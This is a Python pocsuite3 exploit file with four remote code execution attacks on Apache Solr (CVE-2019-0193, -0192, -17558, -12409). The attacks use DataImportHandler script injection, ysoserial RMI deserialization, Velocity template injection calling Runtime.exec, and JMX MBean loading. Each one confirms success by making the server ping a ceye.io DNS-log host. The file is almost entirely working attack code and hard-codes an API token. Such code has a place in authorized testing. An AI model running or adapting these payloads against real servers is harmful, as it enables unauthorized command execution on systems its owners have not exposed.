#!/usr/bin/env python
#coding=utf-8

import random
import json
import time
import subprocess
import signal
import os
import sys
import base64
import re
from string import ascii_letters

from pocsuite3.api import requests as req
from pocsuite3.api import register_poc
from pocsuite3.api import Output, POCBase
from pocsuite3.api import POC_CATEGORY, VUL_TYPE

# 需要ysoserial.jar包
# 需要jython-standalone-2.7.1.jar，mjet.py

'''
CVE-2019-0193
'''
class Solr_RCE_0193(POCBase):
    vulID = 'solr-CVE-2019-1093'
    appName = 'Solr'
    appVersion = 'Apache Solr < 8.2.0'
    category = POC_CATEGORY.EXPLOITS.REMOTE
    vulType = VUL_TYPE.CODE_EXECUTION
    vulDate = '2019-08-01'  # 漏洞公开的时间,不知道就写今天
    author = 'shadowsock5'  # PoC作者的大名
    createDate = '2019-08-11'  # 编写 PoC 的日期
    updateDate = '2020-02-18'  # PoC 更新的时间,默认和编写时间一样
    references = ['https://www.openwall.com/lists/oss-security/2019/08/01/1']  # 漏洞地址来源,0day不用写
    name = 'Solr DataImportHandler远程代码执行漏洞'  # PoC 名称
    install_requires = []  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    cvss = u"高危"

    
    # 使用随机字符串作为banner，通过ceye的接口判断命令是否被执行
    DOMAIN = 'wvg689.ceye.io'
    TOKEN = '76dce59a986eab595838f7dc74903035'
    BANNER = ''.join([random.choice(ascii_letters) for i in range(6)])
    CEYE_URL = 'http://api.ceye.io/v1/records?token={0}&type=dns&filter={1}'.format(TOKEN, BANNER)

    HTTP_PROXY = "http://192.168.170.1:8087"
    proxies = {"http": HTTP_PROXY, "https": HTTP_PROXY}


    def _verify(self):
        result={}

        vul_url = self.url
        
        url1 = vul_url + "/solr/admin/cores?wt=json"

        payload = '''
        command=full-import&dataConfig=
        <dataConfig>
            <dataSource type="URLDataSource"/>
                <script><![CDATA[ java.lang.Runtime.getRuntime().exec("ping {0}.{1}"); 
                ]]></script>
            <document>
                <entity name="a"
                    url="https://stackoverflow.com/feeds"
                    processor="XPathEntityProcessor"
                    forEach="/feed"
                    transformer="script:" />
            </document>
        </dataConfig>
        '''.format(self.BANNER, self.DOMAIN)

        url2 = self.get_vul_url(url1)

        url3 = url2 + "?" + payload
        
        try:
            req.get(url3, proxies=self.proxies)    # 利用。也可以用POST
        except Exception as e:
            print(e)
        
        time.sleep(2) # 休眠2s等待ceye生成记录
        if self.test_dnslog(self.CEYE_URL):
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = target_url
            return self.save_output(result)
        return self.save_output(result)


    ''' 拿到core的名字，并生成待利用的url'''
    def get_vul_url(self, p_url_cores):
        r = req.get(p_url_cores, verify=False, allow_redirects=False, proxies=self.proxies)
        
        if r.status_code == 200:
            if r.json()['status'] == "":    # 失败，退出
                return
            else:
                a = list(r.json()['status'].keys())
                p_vul_url = '{0}/solr/{1}/dataimport'.format(self.url, a[0])
        return p_vul_url


    # 验证DNS已被解析，命令执行
    def test_dnslog(self, url):
        resp = req.get(url)
        d = resp.json()
        try:
            name = d['data'][0]['name']
            if self.BANNER in name:
                return True
        except Exception:
            return False            


    # 攻击模块
    def _attack(self):
        return self._verify()

    # 输出报告
    def save_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail()
        return output



'''
CVE-2019-0192
'''
class Solr_RCE_0192(POCBase):
    vulID = 'solr-CVE-2019-1092'
    appName = 'Solr'
    appVersion = 'Apache Solr 5.0.0 to 5.5.5, 6.0.0 to 6.6.5'
    category = POC_CATEGORY.EXPLOITS.REMOTE
    vulType = VUL_TYPE.CODE_EXECUTION
    vulDate = '2019-03-12'  # 漏洞公开的时间,不知道就写今天
    author = 'shadowsock5'  # PoC作者的大名
    createDate = '2020-02-19'  # 编写 PoC 的日期
    updateDate = '2020-02-19'  # PoC 更新的时间,默认和编写时间一样
    references = ['https://mp.weixin.qq.com/s/ZtqM2EhB2BbZmDt1omvF6A']  # 漏洞地址来源,0day不用写
    name = 'Solr反序列化远程代码执行漏洞'  # PoC 名称
    install_requires = []  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    cvss = u"高危"

    
    # 使用随机字符串作为banner，通过ceye的接口判断命令是否被执行
    DOMAIN = 'wvg689.ceye.io'
    TOKEN = '76dce59a986eab595838f7dc74903035'
    BANNER = ''.join([random.choice(ascii_letters) for i in range(6)])
    CEYE_URL = 'http://api.ceye.io/v1/records?token={0}&type=dns&filter={1}'.format(TOKEN, BANNER)

    HTTP_PROXY = "http://192.168.170.1:8087"


    def _verify(self):
        result={}

        vul_url = self.url    # "http://127.0.0.1:8983"

        target_url = vul_url
        url1 = vul_url + "/solr/admin/cores?wt=json"

        headers = {"Content-Type": "application/json"}

        command = "'ping {0}.{1}'".format(self.BANNER, self.DOMAIN)

        #command = base64.b64encode(command.encode('utf-8'))
        #command_str = command.decode('utf-8')
        #command_str = command_str.replace('/', '+')

        # 云上ysoserial文件路径
        YSOSERIAL_PATH = "/home/cqq/ysoserial-0.0.6-SNAPSHOT-BETA-all.jar"
        # 云上ysoserial的IP，以及监听的RMI端口
        RHOST = "192.168.170.139"   # 到时候填写ysoserial所在服务器的IP
        RPORT = "1099"


        pro = subprocess.Popen(
                "java -cp {0} ysoserial.exploit.JRMPListener {1} Jdk7u21 {2}".format(YSOSERIAL_PATH, RPORT, command), 
                stdout=subprocess.PIPE,shell=True, preexec_fn=os.setsid)

        post_json = {"set-property": {"jmx.serviceUrl": "service:jmx:rmi:///jndi/rmi://{0}:{1}/obj".format(RHOST, RPORT)}}

        url2 = self.get_vul_url(url1)
        
        # 漏洞利用
        r = req.post(url2, headers=headers, json=post_json, proxies={"http": self.HTTP_PROXY})

        if r.status_code == 500:
            m = re.search('(undeclared checked exception; nested exception is)', r.text)
            if m:
                pass    # 认为利用成功

        time.sleep(2) # 休眠2s等待ceye生成记录


        if self.test_dnslog(self.CEYE_URL):
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = target_url
            return self.save_output(result)
        return self.save_output(result)


    # 验证DNS已被解析，命令执行
    def test_dnslog(self, url):
        resp = req.get(url)
        d = resp.json()
        try:
            name = d['data'][0]['name']
            if self.BANNER in name:
                return True
        except Exception:
            return False            


    ''' 拿到core的名字，返回这个core的config路径'''
    def get_vul_url(self, p_url_cores):
        r = req.get(p_url_cores, verify=False, allow_redirects=False, proxies= {"http": self.HTTP_PROXY})
        
        if r.status_code == 200:
            if r.json()['status'] == "":    # 失败，退出
                self.save_output(result)
            else:
                a = list(r.json()['status'].keys())
        return '{0}/solr/{1}/config'.format(self.url, a[0])


    # 攻击模块
    def _attack(self):
        return self._verify()

    # 输出报告
    def save_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail()
        return output


'''
CVE-2019-17558
'''
class Solr_RCE_17558(POCBase):
    vulID = 'solr-CVE-2019-17558'
    appName = 'Solr'
    appVersion = '5.0.0 <= Apache Solr <= 8.3.1'
    category = POC_CATEGORY.EXPLOITS.REMOTE
    vulType = VUL_TYPE.CODE_EXECUTION
    vulDate = '2019-10-30'  # 漏洞公开的时间,不知道就写今天
    author = 'shadowsock5'  # PoC作者的大名
    createDate = '2019-10-31'  # 编写 PoC 的日期
    updateDate = '2020-02-18'  # PoC 更新的时间,默认和编写时间一样
    references = ['https://gist.githubusercontent.com/s00py/a1ba36a3689fa13759ff910e179fc133/raw/fae5e663ffac0e3996fd9dbb89438310719d347a/gistfile1.txt']  # 漏洞地址来源,0day不用写
    name = 'Solr模板注入远程代码执行漏洞'  # PoC 名称
    install_requires = []  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    cvss = u"高危"

    
    # 使用随机字符串作为banner，通过ceye的接口判断命令是否被执行
    DOMAIN = 'wvg689.ceye.io'
    TOKEN = '76dce59a986eab595838f7dc74903035'
    BANNER = ''.join([random.choice(ascii_letters) for i in range(6)])
    CEYE_URL = 'http://api.ceye.io/v1/records?token={0}&type=dns&filter={1}'.format(TOKEN, BANNER)

    HTTP_PROXY = "http://192.168.170.1:8087"


    def _verify(self):
        result={}

        vul_url = self.url
        
        url_cores = vul_url + "/solr/admin/cores?wt=json"

        payload1_j = {
            "update-queryresponsewriter": {
                "name": "velocity",
                "class": "solr.VelocityResponseWriter",
                "template.base.dir": "",
                "params.resource.loader.enabled": "true"
            }
        }
        payload2 = "wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27ping%20{0}.{1}%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end".format(self.BANNER, self.DOMAIN)

        core_name = self.get_core_name(url_cores)

        select_url = "/solr/" + core_name + "/select"
        
        config_url = "/solr/" + core_name + "/config"

        url1 = vul_url + config_url
        url2 = vul_url + select_url + "?" + payload2
        
        # 第一步，配置
        r1 = req.post(url1, json=payload1_j)
        if r1.status_code == 200:
            # 第二步，利用
            r2 = req.get(url2)
        
        time.sleep(2) # 休眠2s等待ceye生成记录
        if self.test_dnslog(self.CEYE_URL):
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = target_url
            return self.save_output(result)
        return self.save_output(result)


    ''' 拿到core的名字'''
    def get_core_name(self, p_url_cores):
        r = req.get(p_url_cores, verify=False, allow_redirects=False)
        
        if r.status_code == 200:
            if r.json()['status'] == "":    # 失败，退出
                self.save_output(result)
            else:
                a = list(r.json()['status'].keys())
        return a[0]


    # 验证DNS已被解析，命令执行
    def test_dnslog(self, url):
        resp = req.get(url)
        d = resp.json()
        try:
            name = d['data'][0]['name']
            if self.BANNER in name:
                return True
        except Exception:
            return False            


    # 攻击模块
    def _attack(self):
        return self._verify()

    # 输出报告
    def save_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail()
        return output


'''
CVE-2019-12409
'''
class Solr_RCE_12409(POCBase):
    vulID = 'solr-CVE-2019-12409'
    appName = 'Solr'
    appVersion = 'Linux版的Solr 8.1.1和8.2.0版本'
    category = POC_CATEGORY.EXPLOITS.REMOTE
    vulType = VUL_TYPE.CODE_EXECUTION
    vulDate = '2019-11-19'  # 漏洞公开的时间,不知道就写今天
    author = 'shadowsock5'  # PoC作者的大名
    createDate = '2020-02-18'  # 编写 PoC 的日期
    updateDate = '2020-02-18'  # PoC 更新的时间,默认和编写时间一样
    references = ['https://mp.weixin.qq.com/s/co5NdHgjPbgVUu1-hzR4gA']  # 漏洞地址来源,0day不用写
    name = 'Solr JMX RCE'  # PoC 名称
    install_requires = []  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    cvss = u"高危"

    
    # 使用随机字符串作为banner，通过ceye的接口判断命令是否被执行
    DOMAIN = 'wvg689.ceye.io'
    TOKEN = '76dce59a986eab595838f7dc74903035'
    BANNER = ''.join([random.choice(ascii_letters) for i in range(6)])
    CEYE_URL = 'http://api.ceye.io/v1/records?token={0}&type=dns&filter={1}'.format(TOKEN, BANNER)


    def _verify(self):
        result={}

        vul_url = self.url

        host = vul_url.strip("http://").strip("https://").split(':')[0]
        port = vul_url.strip("http://").strip("https://").split(':')[1]
        
        #payload = "/System/Applications/Calculator.app/Contents/MacOS/Calculator"
        payload = "'ping {0}.{1}'".format(self.BANNER, self.DOMAIN)

        # 云上jython文件路径
        JYTHON_PATH = "~/downloads/jython-standalone-2.7.1.jar"
        # mjet.py文件路径
        MJET_PATH = "mjet.py"
        # 云上mjet的web server监听的IP，端口
        RHOST = "192.168.170.1"
        RPORT = "8000"

        command1 = "java -jar {0}  {1} {2} {3} install super_secret http://{4}:{5} {5}".format(JYTHON_PATH, MJET_PATH, host, port, RHOST, RPORT)
        command2 = "java -jar {0}  {1} {2} {3} command super_secret {4}".format(JYTHON_PATH, MJET_PATH, host, port, payload)


        pro = subprocess.Popen(command1,
                stdout=subprocess.PIPE,shell=True, preexec_fn=os.setsid)
        
        pro = subprocess.Popen(command2,
                stdout=subprocess.PIPE,shell=True, preexec_fn=os.setsid)
     

        time.sleep(2) # 休眠2s等待ceye生成记录
        if self.test_dnslog(self.CEYE_URL):
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = target_url
            return self.save_output(result)
        return self.save_output(result)


    # 验证DNS已被解析，命令执行
    def test_dnslog(self, url):
        resp = req.get(url)
        d = resp.json()
        try:
            name = d['data'][0]['name']
            if self.BANNER in name:
                return True
        except Exception:
            return False            


    # 攻击模块
    def _attack(self):
        return self._verify()

    # 输出报告
    def save_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail()
        return output


# 注册类
register_poc(Solr_RCE_0193)
register_poc(Solr_RCE_0192)
register_poc(Solr_RCE_17558)
register_poc(Solr_RCE_12409)
